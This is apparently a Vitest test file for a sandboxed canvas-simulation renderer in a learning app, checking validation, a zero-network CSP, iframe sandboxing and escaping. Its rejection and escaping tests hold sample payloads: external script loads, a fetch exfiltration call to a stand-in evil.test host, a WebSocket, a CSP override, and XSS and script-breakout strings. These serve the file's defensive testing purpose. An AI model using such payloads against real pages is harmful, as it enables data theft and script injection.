import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  buildCanvasSimSrcDoc,
  buildStandaloneCanvasHtml,
  CANVAS_INNER_CSP,
  CANVAS_MAX_HEIGHT,
  CANVAS_MIN_HEIGHT,
  INITIAL_CANVAS_BRIDGE_STATE,
  parseCanvasFence,
  reduceCanvasBridgeState,
  validateCanvasSim,
} from "../canvasSim";
import { extractVisualExample, validateVisualExample } from "../visuals";
import { VisualExample } from "../../../components/learning/VisualExample";
import { MarkdownView } from "../../../components/chat/MarkdownView";

const waveCanvasVisual = {
  kind: "canvas" as const,
  title: "Wave Superposition Lab",
  summary:
    "Two sine waves add point-by-point; shifting phase from 0° to 180° moves from constructive to destructive interference.",
  canvas: {
    controlsHint: "Drag the phase offset slider from 0° to 180°.",
    height: 300,
    html: `<canvas id="wave" width="560" height="200"></canvas>
<div class="controls">
  <label>Phase <strong id="phaseOut">0°</strong>
    <input id="phase" type="range" min="0" max="180" value="0">
  </label>
</div>`,
    js: `const { ctx, width, height } = window.setupForgeCanvas("wave", 200);
const slider = document.getElementById("phase");
const out = document.getElementById("phaseOut");
function draw() {
  const deg = Number(slider.value);
  out.textContent = deg + "°";
  const rad = (deg * Math.PI) / 180;
  ctx.clearRect(0, 0, width, height);
  ctx.strokeStyle = window.FORGE_THEME.accent;
  ctx.lineWidth = 2;
  ctx.beginPath();
  for (let x = 0; x < width; x++) {
    const k = (x / width) * Math.PI * 4;
    const y = height / 2 - 36 * (Math.sin(k) + Math.sin(k + rad));
    if (x === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
  }
  ctx.stroke();
}
slider.addEventListener("input", draw);
draw();`,
  },
  items: [
    {
      id: "in-phase",
      label: "0° phase offset (constructive)",
      description: "Peaks align with peaks, doubling the combined amplitude.",
    },
    {
      id: "out-of-phase",
      label: "180° phase offset (destructive)",
      description:
        "Peaks align with troughs of equal size, cancelling to a flat line.",
    },
  ],
  takeaway:
    "Superposition adds displacements at every point: phase alignment governs whether waves reinforce or cancel.",
};

describe("sandboxed interactive canvas simulation contract", () => {
  it("validates structured kind='canvas' visuals and extracts forge-visual blocks", () => {
    const validated = validateVisualExample(waveCanvasVisual);
    expect(validated).not.toBeNull();
    expect(validated?.kind).toBe("canvas");
    expect(validated?.canvas?.height).toBe(300);
    expect(validated?.canvas?.controlsHint).toContain("phase offset");

    const extracted = extractVisualExample(
      `Try shifting the phase below.\n\`\`\`forge-visual\n${JSON.stringify(
        waveCanvasVisual
      )}\n\`\`\``
    );
    expect(extracted).toEqual(validated);
  });

  it("normalizes single-file full HTML documents passed in html or code", () => {
    const singleDoc = validateCanvasSim({
      code: `<!doctype html>
<html>
<head><style>.box { color: #cfb292; }</style></head>
<body>
  <canvas id="boids" width="500" height="240"></canvas>
  <button id="reset" type="button">Scatter</button>
  <script>
    const c = document.getElementById("boids");
    const ctx = c.getContext("2d");
    ctx.fillRect(10, 10, 40, 40);
  </script>
</body>
</html>`,
      height: 999,
    });
    expect(singleDoc).not.toBeNull();
    expect(singleDoc?.css).toContain(".box");
    expect(singleDoc?.html).toContain('<canvas id="boids"');
    expect(singleDoc?.html).not.toContain("<script>");
    expect(singleDoc?.js).toContain('getContext("2d")');
    expect(singleDoc?.height).toBe(640); // clamped to max 640
  });

  it("rejects external scripts, network exfiltration APIs, nested frames, and non-interactive markup", () => {
    const badPayloads = [
      // External CDN script tag
      {
        html: '<canvas id="c"></canvas><script src="https://cdn.evil.test/x.js"></script>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // External stylesheet link
      {
        html: '<link rel="stylesheet" href="https://evil.test/a.css"><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Attempted CSP meta override
      {
        html: '<meta http-equiv="Content-Security-Policy" content="default-src *"><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Nested iframe
      {
        html: '<iframe src="https://evil.test"></iframe><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Outbound fetch exfiltration
      {
        html: '<canvas id="c"></canvas>',
        js: 'fetch("https://evil.test/steal?x=1");',
      },
      // Outbound WebSocket
      {
        html: '<canvas id="c"></canvas>',
        js: 'const ws = new WebSocket("wss://evil.test");',
      },
      // Outbound XMLHttpRequest
      {
        html: '<canvas id="c"></canvas>',
        js: 'const xhr = new XMLHttpRequest();',
      },
      // Plain static prose with no interactive or canvas surface
      {
        html: "<p>Just a static paragraph with nothing to manipulate.</p>",
        js: "const a = 1 + 2; console.log(a);",
      },
    ];

    for (const bad of badPayloads) {
      expect(validateCanvasSim(bad)).toBeNull();
    }
  });

  it("injects strict zero-network CSP first in srcDoc and escapes closing script/style breakouts", () => {
    const spec = validateCanvasSim({
      html: '<canvas id="c"></canvas>',
      css: ".note::after { content: '</style><script>evil()</script>'; }",
      js: 'const label = "</script><img src=x onerror=evil()>"; const ctx = document.getElementById("c").getContext("2d");',
    })!;
    expect(spec).not.toBeNull();

    const srcDoc = buildCanvasSimSrcDoc(spec, "tok-123");
    expect(srcDoc).toContain(CANVAS_INNER_CSP);
    expect(srcDoc).toContain("connect-src 'none'");
    expect(srcDoc).toContain("default-src 'none'");
    // CSP meta must appear before any <script> tag
    expect(srcDoc.indexOf("Content-Security-Policy")).toBeLessThan(
      srcDoc.indexOf("<script>")
    );
    // Closing tag breakouts inside CSS/JS must be escaped
    expect(srcDoc).toContain("<\\/style>");
    expect(srcDoc).toContain("<\\/script>");
    expect(srcDoc).toContain("window.setupForgeCanvas");
    expect(srcDoc).toContain('"tok-123"');
  });

  it("authenticates postMessage tokens and clamps resize heights in reduceCanvasBridgeState", () => {
    const token = "lf-valid-1";
    // Wrong token or wrong source is ignored completely
    expect(
      reduceCanvasBridgeState(
        INITIAL_CANVAS_BRIDGE_STATE,
        { source: "learnforge-canvas", token: "wrong", type: "error", message: "fake" },
        token
      )
    ).toBe(INITIAL_CANVAS_BRIDGE_STATE);

    expect(
      reduceCanvasBridgeState(
        INITIAL_CANVAS_BRIDGE_STATE,
        { source: "other", token, type: "interact" },
        token
      )
    ).toBe(INITIAL_CANVAS_BRIDGE_STATE);

    // Valid resize clamps low & high values
    const low = reduceCanvasBridgeState(
      INITIAL_CANVAS_BRIDGE_STATE,
      { source: "learnforge-canvas", token, type: "resize", height: 40 },
      token
    );
    expect(low.height).toBe(CANVAS_MIN_HEIGHT);

    const high = reduceCanvasBridgeState(
      low,
      { source: "learnforge-canvas", token, type: "resize", height: 4000 },
      token
    );
    expect(high.height).toBe(CANVAS_MAX_HEIGHT);

    // Valid interact + error transitions
    const interacted = reduceCanvasBridgeState(
      high,
      { source: "learnforge-canvas", token, type: "interact" },
      token
    );
    expect(interacted.interacted).toBe(true);

    const errored = reduceCanvasBridgeState(
      interacted,
      {
        source: "learnforge-canvas",
        token,
        type: "error",
        message: "ReferenceError: boidVelocity is not defined",
      },
      token
    );
    expect(errored.error).toBe("ReferenceError: boidVelocity is not defined");
  });

  it("renders zero-origin sandbox='allow-scripts' iframe (never allow-same-origin) with escaped text equivalent", () => {
    const validated = validateVisualExample({
      ...waveCanvasVisual,
      title: "Wave Lab <img src=x onerror=attack()>",
    })!;
    const markup = renderToStaticMarkup(
      <VisualExample visual={validated} visualId="wave-1" />
    );

    expect(markup).toContain('sandbox="allow-scripts"');
    expect(markup).not.toContain("allow-same-origin");
    expect(markup).toContain('referrerPolicy="no-referrer"');
    // Title XSS attempt is escaped in parent DOM
    expect(markup).toContain("&lt;img src=x onerror=attack()&gt;");
    expect(markup).not.toContain("<img src=x");
    // Guaranteed text equivalent remains present
    expect(markup).toContain("Read as text");
    expect(markup).toContain("180° phase offset (destructive)");
    expect(markup).toContain("Save HTML");
  });

  it("renders inline ```forge-canvas blocks in MarkdownView and hides incomplete streaming JSON gracefully", () => {
    const inlineBlock = [
      "Explore how phase governs interference:",
      "```forge-canvas",
      JSON.stringify({
        title: waveCanvasVisual.title,
        summary: waveCanvasVisual.summary,
        takeaway: waveCanvasVisual.takeaway,
        ...waveCanvasVisual.canvas,
      }),
      "```",
    ].join("\n");

    const rendered = renderToStaticMarkup(<MarkdownView content={inlineBlock} />);
    expect(rendered).toContain('sandbox="allow-scripts"');
    expect(rendered).not.toContain("allow-same-origin");
    expect(rendered).toContain("Wave Superposition Lab");

    // Incomplete mid-stream block shows calm status instead of dumping raw JS
    const streaming = "```forge-canvas\n{\"title\":\"Boids\",\"html\":\"<canvas";
    const pendingHtml = renderToStaticMarkup(<MarkdownView content={streaming} />);
    expect(pendingHtml).toContain("Preparing interactive simulation");
    expect(pendingHtml).not.toContain("<canvas");
  });

  it("builds standalone offline HTML export with escaped metadata and null bridge token", () => {
    const validated = validateVisualExample(waveCanvasVisual)!;
    const exported = buildStandaloneCanvasHtml(
      'Wave <script>alert("x")</script>',
      validated.canvas!,
      { summary: validated.summary, takeaway: validated.takeaway }
    );
    expect(exported).toContain(CANVAS_INNER_CSP);
    expect(exported).toContain("var TOKEN = null;");
    expect(exported).toContain("&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;");
  });
});
